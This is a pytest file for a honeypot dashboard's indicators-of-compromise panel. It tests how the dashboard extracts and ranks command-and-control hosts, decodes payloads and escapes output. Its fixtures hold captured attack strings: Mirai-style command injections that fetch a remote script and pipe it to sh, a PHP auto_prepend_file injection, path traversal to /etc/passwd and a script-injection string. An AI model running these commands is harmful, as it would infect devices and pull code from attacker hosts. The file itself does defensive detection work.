"""Tests for the Indicators-of-Compromise dashboard panel (issue #351).

Covers:

* :func:`manyfaced.web.dashboard._extract_c2_hosts` ranks hosts found inside
  ``request_raw`` text by mention frequency (the ``91.92.40.118`` C2 drop host
  must surface top when seeded).
* The dashboard payload carries the IoC keys (``c2_hosts`` / ``ioc_since``) and
  the render emits an ``#ioc`` section.
"""

from __future__ import annotations

from datetime import datetime, timedelta

import pytest

from manyfaced.web import dashboard as _dash_mod
from manyfaced.web.payload_decode import decode_payload
from manyfaced.web import dashboard_render as _render_mod


# ---------------------------------------------------------------------------
# _extract_c2_hosts
# ---------------------------------------------------------------------------


class _FakeStore:
    """Stand-in storage whose fetch_request_raws returns scripted raw payloads."""

    def __init__(self, raws: list[str]) -> None:
        self._raws = raws
        self.last_since: object = object()  # sentinel so we can assert it was passed

    def fetch_request_raws(self, since=None, limit=20000):  # noqa: ANN001, ANN002
        self.last_since = since
        self.last_limit = limit
        return list(self._raws)


def test_extract_c2_hosts_ranks_mirai_drop_host_top():
    raws = [
        'GET /cgi-bin?x=$(wget http://91.92.40.118/mirai -O - | sh) HTTP/1.1',
        'POST /boaform/admin/formLogin?x=wget http://91.92.40.118/mips HTTP/1.1',
        'GET /cgi-bin?x=wget http://91.92.40.118/arm -O - | sh HTTP/1.1',
        # https variant of the same host must de-dupe to the same entry.
        'GET /cgi-bin?x=wget https://91.92.40.118/x86 -O - | sh HTTP/1.1',
    ]
    store = _FakeStore(raws)
    hosts = _dash_mod._extract_c2_hosts(store, since='2026-01-01 00:00:00.000000')
    assert store.last_since == '2026-01-01 00:00:00.000000'
    assert store.last_limit == _dash_mod._C2_RAW_SCAN_LIMIT
    assert hosts, 'no C2 hosts extracted'
    # 91.92.40.118 appears 4 times (3 http + 1 https).
    assert hosts[0]['host'] == '91.92.40.118'
    assert hosts[0]['count'] == 4
    # Bounded by _C2_TOP_N.
    assert len(hosts) <= _dash_mod._C2_TOP_N


def test_extract_c2_hosts_ignores_benign_urls_false_positives():
    """Operator feedback: the raw request is full of benign URLs (the honeypot's
    own response links, reflected attacker URLs to legit sites, Host/Referer
    headers). Only hosts in a *download* context (wget/curl/tftp/$(...)) count;
    everything else is noise and must be excluded."""
    raws = [
        # Reflected/legit URL with NO fetch tool before it -> ignored.
        'GET /x?u=http://203.0.113.9/p HTTP/1.1',
        'GET / HTTP/1.1\nHost: example.com\nReferer: http://example.com/',
        # The honeypot's own response links -> ignored.
        'GET /router.cgi HTTP/1.1\n<a href="http://127.0.0.1/admin">x</a>',
        # Private/reserved space -> ignored even if it had a fetch tool.
        'wget http://192.168.1.1/m.sh',
        # Real drop host with a fetch tool -> counted.
        'GET /cgi-bin?x=`cd /tmp; wget http://91.92.40.118/wget.sh` HTTP/1.1',
        'curl http://91.92.40.118/x86 -o /tmp/x',
    ]
    store = _FakeStore(raws)
    hosts = _dash_mod._extract_c2_hosts(store, since='2026-01-01 00:00:00.000000')
    got = {h['host']: h['count'] for h in hosts}
    assert got == {'91.92.40.118': 2}
    # None of the benign / private hosts leak into the panel.
    assert '203.0.113.9' not in got
    assert 'example.com' not in got
    assert '127.0.0.1' not in got
    assert '192.168.1.1' not in got


def test_extract_c2_hosts_empty_when_no_urls():
    store = _FakeStore(['GET /foo HTTP/1.1', 'POST /bar HTTP/1.1'])
    assert _dash_mod._extract_c2_hosts(store, since=None) == []


def test_extract_c2_hosts_handles_store_error_gracefully():
    class _BoomStore:
        def fetch_request_raws(self, since=None, limit=20000):  # noqa: ANN001, ANN002
            raise RuntimeError('db down')

    # Must not raise — the IoC scan must never break the dashboard payload.
    assert _dash_mod._extract_c2_hosts(_BoomStore(), since=None) == []


def test_extract_c2_hosts_decodes_encoded_payload():
    """Issue #368: a URL-encoded payload hiding a C2 host must be decoded before
    the C2 scan, so the hidden drop host surfaces (raw-byte scan misses it)."""
    crlf = chr(13) + chr(10)
    raw = (
        'POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file'
        '%3dphp://input HTTP/1.1' + crlf + '(wget --no-check-certificate -qO- '
        'https://14.46.136.77/sh || curl -sk https://14.46.136.77/sh) | sh'
    )
    store = _FakeStore([raw])
    hosts = _dash_mod._extract_c2_hosts(store, since=None)
    got = {h['host']: h['count'] for h in hosts}
    assert got.get('14.46.136.77') == 1, f'encoded C2 host not extracted: {got}'


# ---------------------------------------------------------------------------
# issue #368: payload_decode.decode_payload
# ---------------------------------------------------------------------------


def test_decode_payload_url_malformed_dot_escapes():
    """The scanner dot/slash escapes the user flagged (`.%2e/`, `.%2f`, ...) —
    standard URL-decode recovers them."""
    assert (
        decode_payload('GET /..%2f..%2fetc%2fpasswd HTTP/1.1') == 'GET /../../etc/passwd HTTP/1.1'
    )
    assert decode_payload('GET /error%2elog%2ebak HTTP/1.1') == 'GET /error.log.bak HTTP/1.1'
    assert (
        decode_payload('GET /node_modules/%2eenv%2eprod HTTP/1.1')
        == 'GET /node_modules/.env.prod HTTP/1.1'
    )
    assert decode_payload('GET /.%2fsecret HTTP/1.1') == 'GET /./secret HTTP/1.1'
    # `%2e%2e%2f` (fully encoded `../`) decodes too.
    assert (
        decode_payload('GET /%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1')
        == 'GET /../../etc/passwd HTTP/1.1'
    )


def test_decode_payload_no_encoding_passthrough():
    """A plain payload is returned unchanged (failsafe, no blanking)."""
    raw = 'GET /admin?x=`wget http://91.92.40.118/x` HTTP/1.1'
    assert decode_payload(raw) == raw


def test_decode_payload_base64_token():
    """A long base64 run is decoded to its text when it validates as printable."""
    import base64

    text = 'wget http://91.92.40.118/x -O /tmp/m.sh'
    b64 = base64.b64encode(text.encode()).decode()
    assert decode_payload(b64) == text


def test_decode_payload_base64_rejected_for_garbage():
    """Random high-entropy strings are NOT force-decoded into garbage."""
    # 20 'A's is valid base64 padding-wise but decodes to non-text -> kept raw.
    raw = 'AAAA' * 5
    assert decode_payload(raw) == raw


def test_decode_payload_nested_double_encoding():
    """Double URL-encoding is unwound (bounded passes)."""
    # %252e%252e%252f == %2e%2e%2f after one pass, then ../ after the second.
    assert decode_payload('GET /%252e%252e%252fetc HTTP/1.1') == 'GET /../etc HTTP/1.1'


# ---------------------------------------------------------------------------
# Payload + render integration (fake aggregate_stats / fetch_request_raws)
# ---------------------------------------------------------------------------


class _FakeAggregateStore:
    """Mimics the dashboard's storage usage for _build_payload without a real DB."""

    def __init__(self) -> None:
        self.since_seen = None
        self.sinces_seen = []

    def aggregate_stats(self, since=None, bucket='hour'):  # noqa: ANN001, ANN002
        self.since_seen = since
        return {
            'total': 520,
            'detected': 10,
            'undetected': 510,
            'unique_ips': 6,
            'by_service': [{'key': 'ssh', 'count': 300}],
            'by_country': [{'key': 'NL', 'count': 220}, {'key': 'HK', 'count': 95}],
            'by_continent': [],
            'by_ip': [
                {'key': '45.153.34.231', 'count': 220},
                {'key': '47.79.23.6', 'count': 95},
                {'key': '139.59.183.60', 'count': 46},
                {'key': '107.174.212.19', 'count': 45},
                {'key': '45.79.120.189', 'count': 45},
                {'key': '45.198.224.92', 'count': 29},
            ],
            'by_path': [{'key': '/', 'count': 500}],
            'by_port': [{'key': 23, 'count': 300}],
            'by_classification': [{'key': 'benign', 'count': 0}, {'key': 'unknown', 'count': 510}],
            'volume': [],
        }

    def fetch_request_raws(self, since=None, limit=20000):  # noqa: ANN001, ANN002
        self.since_seen = since
        self.sinces_seen.append(since)
        return ['wget http://91.92.40.118/mirai -O - | sh' for _ in range(52)] + [
            'GET /normal HTTP/1.1',
        ]

    def fetch_interesting_raws(self, since=None, limit=20000, ip=None, host=None):  # noqa: ANN001, ANN002
        # The dashboard now pulls payloads via fetch_interesting_raws; mirror the
        # fetch_request_raws rows as dicts so _build_payload's payload panel works.
        self.since_seen = since
        self.sinces_seen.append(since)
        self.ip_seen = ip
        self.host_seen = host
        return [
            {
                'raw': 'wget http://91.92.40.118/mirai -O - | sh',
                'classification': 'unknown',
                'detected_id': None,
                'request_path': '/',
                'request_command': 'GET',
                'login': '',
            }
            for _ in range(52)
        ] + [
            {
                'raw': 'GET /normal HTTP/1.1',
                'classification': 'unknown',
                'detected_id': None,
                'request_path': '/normal',
                'request_command': 'GET',
                'login': '',
            },
        ]

    def volume_series(self, since=None, bucket='hour', port=None):  # noqa: ANN001, ANN002
        return []

    def nonbenign_ports(self):  # noqa: ANN001, ANN002
        # Mirror aggregate_stats.by_port but strip benign-only ports. The fake's
        # only port (23) has benign=0 in by_classification, so it counts.
        return [r['key'] for r in [{'key': 23}] if r['key']]

    def last_capture_ts(self):  # noqa: ANN001, ANN002
        return '2026-07-09 23:59:59.000000'

    def count_recent(self, since=None, ip=None, host=None):  # noqa: ANN001, ANN002
        return 0

    def recent_records(self, limit=50, since=None, offset=0, ip=None, host=None):  # noqa: ANN001, ANN002
        return []


class _FakeBenignOnlyStore(_FakeAggregateStore):
    """Like _FakeAggregateStore but every captured hit is benign.

    by_port says 23/80/443 were hit, but nonbenign_ports() returns nothing —
    so the hero must fall back to configured ports, never surface the
    benign-warmed ports as "active" (issue #409).
    """

    def nonbenign_ports(self):  # noqa: ANN001, ANN002
        return []

    def last_capture_ts(self):  # noqa: ANN001, ANN002
        return '2026-07-10 11:00:00.000000'


def test_build_payload_excludes_benign_only_ports_from_hero(monkeypatch):
    store = _FakeBenignOnlyStore()
    monkeypatch.setattr(_dash_mod._storage, 'get_storage', lambda **kw: store)
    monkeypatch.setattr(
        type(_dash_mod._config.settings), 'resolve_ports', lambda self: [22, 80, 443]
    )
    payload = _dash_mod._build_payload('24h', token='tok', page=1)
    # by_port had 23/80/443, but they were all benign -> the benign-warmed
    # port 23 must NOT appear as an active port.
    active = [p for p, _w in payload['display_ports']]
    assert 23 not in active
    # With no non-benign activity, the panel falls back to the configured
    # listening ports (22/80/443) so it isn't empty.
    assert active == [22, 80, 443]
    assert payload['nonbenign_active_count'] == 3
    # last_capture flows through for the liveness badge.
    assert payload['last_capture'] == '2026-07-10 11:00:00.000000'


def test_build_payload_surfaces_real_nonbenign_ports(monkeypatch):
    store = _FakeAggregateStore()  # nonbenign_ports() -> [23]
    monkeypatch.setattr(_dash_mod._storage, 'get_storage', lambda **kw: store)
    monkeypatch.setattr(
        type(_dash_mod._config.settings), 'resolve_ports', lambda self: [22, 80, 443]
    )
    payload = _dash_mod._build_payload('24h', token='tok', page=1)
    active = [p for p, _w in payload['display_ports']]
    assert 23 in active  # the one port with a real (non-benign) hit
    # Configured-but-unhit ports do NOT pad the hero.
    assert 22 not in active and 80 not in active and 443 not in active
    assert payload['nonbenign_active_count'] == 1


def test_render_hero_sub_reports_real_active_count():
    payload = {
        'hostname': 'hive-01',
        'mult': 6,
        'display_ports': [(23, 5), (443, 2)],
        'nonbenign_active_count': 2,
        'listening_count': 9,
        'last_capture': '2026-07-10 11:00:00.000000',
        'stats': {'hour_total': 7, 'total': 42, 'day': 10, 'unique_ips': 5},
    }
    html = _render_mod._render_hero(payload)
    # Sub-line reports the real non-benign count, not the configured count.
    assert '<b>2</b> ports hit' in html
    assert 'by non-benign senders' in html
    # The live liveness badge carries the real last-seen timestamp.
    assert 'data-last="2026-07-10 11:00:00.000000"' in html
    # Hero canvas gets the ports-lit count.
    assert 'data-bcount="2"' in html


def test_render_fragment_meta_includes_last_capture():
    payload = {
        'hostname': 'hive-01',
        'mult': 6,
        'display_ports': [],
        'nonbenign_active_count': 0,
        'listening_count': 1,
        'last_capture': '2026-07-10 11:00:00.000000',
        'stats': {'total': 0, 'day': 0, 'unique_ips': 0, 'hour_total': 0},
        'by_port': [],
        'by_country': [],
        'by_service': [],
        'by_ip': [],
        'by_classification': [],
        'c2_hosts': [],
        'ioc_since': None,
        'volume_bars': [],
        'log_rows': [],
        'payloads': [],
        'log_window_total': 0,
        'log_page_size': 50,
        'page': 1,
        'range': '24h',
        'token': 'tok',
        'log_summary': 'no captures',
    }
    frag = _render_mod.render_fragment(payload)
    frag = frag.decode('utf-8') if isinstance(frag, bytes) else frag
    # The live-tick meta block exposes lastCapture so the badge can refresh.
    assert 'lastCapture' in frag
    assert '2026-07-10 11:00:00.000000' in frag


def test_build_payload_includes_ioc_keys(monkeypatch):
    store = _FakeAggregateStore()
    monkeypatch.setattr(_dash_mod._storage, 'get_storage', lambda **kw: store)
    payload = _dash_mod._build_payload('24h', token='tok', page=1)
    assert payload['c2_hosts'], 'c2_hosts missing/empty'
    assert payload['c2_hosts'][0]['host'] == '91.92.40.118'
    assert payload['c2_hosts'][0]['count'] == 52
    # Top attacker IPs surface straight from aggregate_stats by_ip.
    top_ip = payload['by_ip'][0]['key']
    assert top_ip == '45.153.34.231'
    assert payload['ioc_since'] is not None


def test_render_page_includes_ioc_section():
    payload = {
        'token': 'tok',
        'range': '24h',
        'page': 1,
        'log_page_size': 50,
        'log_window_total': 0,
        'generated_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'hostname': 'node1',
        'mult': 6,
        'display_ports': [],
        'listening_count': 1,
        'stats': {'total': 520, 'day': 10, 'unique_ips': 6, 'hour_total': 1},
        'by_port': [],
        'by_country': [{'key': 'NL', 'count': 220}],
        'by_service': [],
        'by_ip': [
            {'key': '45.153.34.231', 'count': 220},
            {'key': '47.79.23.6', 'count': 95},
        ],
        'by_classification': [],
        'c2_hosts': [
            {'host': '91.92.40.118', 'count': 52},
            {'host': '203.0.113.9', 'count': 3},
        ],
        'ioc_since': '2026-07-09 00:00:00.000000',
        'volume_bars': [],
        'log_rows': [],
        'log_summary': 'no captures',
    }
    html = _render_mod.render_page(payload)
    assert 'INDICATORS OF COMPROMISE' in html
    assert 'TOP ATTACKER IPS' in html
    assert 'C2 / DOWNLOAD HOSTS' in html
    assert '45.153.34.231' in html
    assert '91.92.40.118' in html
    # The section anchor is present for the nav link (#ioc).
    assert 'id="ioc"' in html
    # Escape check: a scripted host must not inject markup.
    bad = _render_mod.render_page({**payload, 'c2_hosts': [{'host': '<x>', 'count': 1}]})
    assert '&lt;x&gt;' in bad
    assert '<x>' not in bad


def test_render_page_includes_payloads_section():
    payload = {
        'token': 'tok',
        'range': '24h',
        'page': 1,
        'log_page_size': 50,
        'log_window_total': 0,
        'generated_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'hostname': 'node1',
        'mult': 6,
        'display_ports': [],
        'listening_count': 1,
        'stats': {'total': 0, 'day': 0, 'unique_ips': 0, 'hour_total': 0},
        'by_port': [],
        'by_country': [],
        'by_service': [],
        'by_ip': [],
        'by_classification': [],
        'c2_hosts': [],
        'ioc_since': '2026-07-09 00:00:00.000000',
        'volume_bars': [],
        'log_rows': [],
        'payloads': [
            {
                'raw': 'GET /hndunblock.cgi?x=`wget http://91.92.40.118/x` HTTP/1.1',
                'bot_ip': '1.2.3.4',
                'listen_port': 80,
                'bot_country': 'US',
                'request_command': 'GET',
                'detected_id': None,
            }
        ],
        'log_summary': 'no captures',
    }
    html = _render_mod.render_page(payload)
    assert 'id="payloads"' in html
    assert 'PAYLOADS' in html
    # Raw payload surfaced, and a scripted payload can't inject markup.
    assert '91.92.40.118' in html
    bad = _render_mod.render_page(
        {
            **payload,
            'payloads': [
                {
                    'raw': '<script>alert(1)</script>',
                    'bot_ip': '',
                    'listen_port': 0,
                    'bot_country': '',
                    'request_command': '',
                    'detected_id': None,
                }
            ],
        }
    )
    assert '&lt;script&gt;' in bad
    assert '<script>alert(1)</script>' not in bad
    payload = {
        'token': 'tok',
        'range': '24h',
        'page': 1,
        'log_page_size': 50,
        'log_window_total': 0,
        'generated_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'hostname': 'node1',
        'mult': 6,
        'display_ports': [],
        'listening_count': 1,
        'stats': {'total': 0, 'day': 0, 'unique_ips': 0, 'hour_total': 0},
        'by_port': [],
        'by_country': [],
        'by_service': [],
        'by_ip': [{'key': '1.2.3.4', 'count': 5}],
        'by_classification': [],
        'c2_hosts': [{'host': '91.92.40.118', 'count': 52}],
        'ioc_since': '2026-07-09 00:00:00.000000',
        'volume_bars': [],
        'log_rows': [],
        'log_summary': 'no captures',
    }
    frag = _render_mod.render_fragment(payload).decode()
    boundary = frag.splitlines()[0]
    assert f'{boundary}:ioc' in frag
    assert '91.92.40.118' in frag


@pytest.mark.parametrize('window', ['1h', '24h', '7d', '30d'])
def test_extract_c2_hosts_runs_inside_payload_window(monkeypatch, window):
    store = _FakeAggregateStore()
    monkeypatch.setattr(_dash_mod._storage, 'get_storage', lambda **kw: store)
    payload = _dash_mod._build_payload(window, token='tok', page=1)
    # The payloads fetch calls fetch_request_raws(since=None) and the all-time
    # aggregate_stats(since=None) overwrite since_seen; what we care about is
    # that the C2 scan (a non-None since) actually ran inside the window.
    assert any(s is not None for s in store.sinces_seen)
    assert any(h['host'] == '91.92.40.118' for h in payload['c2_hosts'])


# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
# Click interactivity (issue #361): rows must carry the data-* attributes the
# wireIocRows() handler reads, and the handler must be present in the page JS.
# ---------------------------------------------------------------------------


def test_ioc_rows_emit_click_data_attributes():
    payload = {
        'token': 'tok',
        'range': '24h',
        'page': 1,
        'log_page_size': 50,
        'log_window_total': 0,
        'generated_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'hostname': 'node1',
        'mult': 6,
        'display_ports': [],
        'listening_count': 1,
        'stats': {'total': 520, 'day': 10, 'unique_ips': 6, 'hour_total': 1},
        'by_port': [],
        'by_country': [{'key': 'NL', 'count': 220}],
        'by_service': [],
        'by_ip': [
            {'key': '45.153.34.231', 'count': 220},
            {'key': '47.79.23.6', 'count': 95},
        ],
        'by_classification': [],
        'c2_hosts': [
            {'host': '91.92.40.118', 'count': 52},
            {'host': '203.0.113.9', 'count': 3},
        ],
        'ioc_since': '2026-07-09 00:00:00.000000',
        'volume_bars': [],
        'log_rows': [],
        'log_summary': 'no captures',
    }
    html = _render_mod.render_page(payload)
    assert 'id="ioc"' in html
    # IP rows: clicking filters the capture log by data-ip.
    assert 'data-ioc-type="ip"' in html
    assert 'data-ioc-value="45.153.34.231"' in html
    # Host rows: clicking copies the host and greps the log.
    assert 'data-ioc-type="host"' in html
    assert 'data-ioc-value="91.92.40.118"' in html


def test_dashboard_js_wires_ioc_rows():
    from manyfaced.web.dashboard_assets import JS as _JS

    assert 'function wireIocRows' in _JS
    # Invoked from both applyFragment and the DOM-ready init block.
    assert _JS.count('wireIocRows()') >= 2


# ---------------------------------------------------------------------------
# Cold-start: prime-before-serve + slow-TTL all-time total (issue #409 follow-up)
# ---------------------------------------------------------------------------


class _CountingStore:
    """aggregate_stats counts how often it's called with since=None (all-time)."""

    def __init__(self) -> None:
        self.all_time_calls = 0

    def aggregate_stats(self, since=None, bucket='hour'):  # noqa: ANN001, ANN002
        if since is None:
            self.all_time_calls += 1
        return {
            'total': 1129806,
            'detected': 10,
            'undetected': 1129796,
            'unique_ips': 6,
            'by_service': [],
            'by_country': [],
            'by_continent': [],
            'by_ip': [],
            'by_path': [],
            'by_port': [],
            'by_classification': [],
            'volume': [],
        }

    def fetch_request_raws(self, since=None, limit=20000):  # noqa: ANN001, ANN002
        return []

    def fetch_interesting_raws(self, since=None, limit=20000, ip=None, host=None):  # noqa: ANN001, ANN002
        return []

    def nonbenign_ports(self):  # noqa: ANN001, ANN002
        return []

    def last_capture_ts(self):  # noqa: ANN001, ANN002
        return None

    def volume_series(self, since=None, bucket='hour', port=None):  # noqa: ANN001, ANN002
        return []

    def count_recent(self, since=None, ip=None, host=None):  # noqa: ANN001, ANN002
        return 0

    def recent_records(self, limit=50, since=None, offset=0, ip=None, host=None):  # noqa: ANN001, ANN002
        return []


def test_get_alltime_total_caches_within_ttl():
    store = _CountingStore()
    _dash_mod._ALLTIME_TOTAL_CACHE = None
    try:
        # First call hits the store (the expensive unbounded COUNT(*)).
        assert _dash_mod._get_alltime_total(store) == 1129806
        assert store.all_time_calls == 1
        # Second call within TTL returns the cached value, no extra store hit.
        assert _dash_mod._get_alltime_total(store) == 1129806
        assert store.all_time_calls == 1
    finally:
        _dash_mod._ALLTIME_TOTAL_CACHE = None


def test_refresh_cache_primes_and_sets_primed(monkeypatch):
    # The background primer must populate the cache AND signal _PRIMED so the
    # server only opens the port once warm (no cold 502/504 stampede).
    _dash_mod._PRIMED.clear()
    _dash_mod._ALLTIME_TOTAL_CACHE = None
    store = _CountingStore()

    # Route get_storage() to our counting store for the primer run.
    import manyfaced.db.storage as _storage_mod

    monkeypatch.setattr(_storage_mod, 'get_storage', lambda **kw: store)
    _dash_mod._refresh_cache('tok')
    # All four ranges built + all-time total warmed -> _PRIMED set.
    assert _dash_mod._PRIMED.is_set()
    # The expensive all-time query ran exactly once during the primer pass,
    # not once per range.
    assert store.all_time_calls == 1
    _dash_mod._PRIMED.clear()
    _dash_mod._ALLTIME_TOTAL_CACHE = None


# ---------------------------------------------------------------------------
# Pagination (issue #316 / regression #416): the capture-log pager is refreshed
# in place by the client's fetch-based applyFragment(), which replaces the DOM
# node *named* by the fragment key ('log-pager'). The server renders the pager
# into a container whose id must equal that target name; if it doesn't, the new
# pager HTML is silently dropped, the pager stays frozen on page 1, and the
# client's state.page desyncs so further clicks no-op ("pagination not
# working"). The container id must be 'log-pager' and the JS must wire it.
# ---------------------------------------------------------------------------


class _FakePagerStore(_FakeAggregateStore):
    """Adds >1 page of capture rows so the pager actually renders."""

    def __init__(self, total: int) -> None:
        super().__init__()
        self._total = total

    def count_recent(self, since=None, ip=None, host=None):  # noqa: ANN001, ANN002
        return self._total

    def recent_records(self, limit=50, since=None, offset=0, ip=None, host=None):  # noqa: ANN001, ANN002
        # Two distinct rows per page; never empty so the log section renders.
        return [
            {
                'timestamp': '2026-07-10 12:00:00',
                'bot_ip': '1.2.3.4',
                'bot_country': 'NL',
                'listen_port': 80,
                'detected_id': None,
                'request_path': '/',
                'request_command': 'GET',
                'request_raw': 'GET / HTTP/1.1',
                'hostname': 'node1',
                'login': '',
                'classification': 'unknown',
            },
            {
                'timestamp': '2026-07-10 11:59:50',
                'bot_ip': '9.9.9.9',
                'bot_country': 'US',
                'listen_port': 23,
                'detected_id': None,
                'request_path': '/',
                'request_command': 'GET',
                'request_raw': 'GET / HTTP/1.1',
                'hostname': 'node1',
                'login': '',
                'classification': 'unknown',
            },
        ]

    def fetch_interesting_raws(self, since=None, limit=20000, ip=None, host=None):  # noqa: ANN001, ANN002
        return []


def test_pager_container_id_matches_fragment_target(monkeypatch):
    store = _FakePagerStore(total=120)  # 120 / 50 per page => 3 pages
    monkeypatch.setattr(_dash_mod._storage, 'get_storage', lambda **kw: store)
    payload = _dash_mod._build_payload('24h', token='tok', page=1)
    html = _render_mod.render_page(payload)
    # The pager must mount in the element applyFragment() replaces.
    assert 'id="log-pager"' in html
    assert 'id="log-pager-wrap"' not in html
    # And it must actually render controls when the window spans >1 page.
    assert 'data-page="2"' in html
    assert 'page 1 / 3' in html


def test_pager_fragment_target_is_log_pager(monkeypatch):
    store = _FakePagerStore(total=120)
    monkeypatch.setattr(_dash_mod._storage, 'get_storage', lambda **kw: store)
    payload = _dash_mod._build_payload('24h', token='tok', page=2)
    frag = _render_mod.render_fragment(payload).decode()
    boundary = frag.splitlines()[0]
    assert f'{boundary}:log-pager' in frag
    # Page 2 must be wired as the current page in the refreshed fragment.
    assert 'page 2 / 3' in frag
    assert 'data-page="3"' in frag


def test_js_wires_log_pager():
    from manyfaced.web.dashboard_assets import JS as _JS

    # Listener binds to the container whose id matches the fragment target.
    assert "$('#log-pager')" in _JS
    assert "$('#log-pager-wrap')" not in _JS
    assert 'function wireLogPager' in _JS
